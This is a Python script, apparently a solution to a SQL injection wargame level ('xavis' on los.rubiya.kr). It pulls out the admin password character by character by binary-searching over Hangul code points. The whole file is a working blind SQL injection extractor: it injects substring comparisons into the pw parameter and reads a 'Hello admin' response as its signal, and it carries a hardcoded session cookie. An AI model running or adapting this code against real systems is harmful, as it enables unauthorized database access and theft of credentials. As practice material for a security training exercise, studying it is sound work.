import requests

char_set = []
for i in range(44032, 55216):
    char_set.append(i)


def binary_search(characters, position):
    lower = 0
    upper = len(characters) - 1

    while lower <= upper:
        mid = (lower + upper) // 2
        # print(f'characters[{mid}]= {characters[mid]}')

        if 'Hello admin' in send_request(position, characters[mid], '='):
            return characters[mid]

        if 'Hello admin' in send_request(position, characters[mid], '>'):
            lower = mid + 1
        else:
            upper = mid - 1


def send_request(position, char, condition):
    url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'
    cookie = {'PHPSESSID': 'cs46vee23eb9l4maja3esa4ec1'}
    payload = f"?pw=' or substring(pw,{position},1){condition}char({char}) and id='admin"
    r = requests.get(url + payload, cookies=cookie)
    return r.text


pw = []
for i in range(1, 4):
    pw.append(binary_search(char_set, str(i)))
    print(f'pw = {pw}')


pw_utf16 = ''
for i in range(3):
    pw_utf16 += str(hex(pw[i])) + ','

print(f'This is UTF-16 => pw = ({pw_utf16[0:-1]}) ')
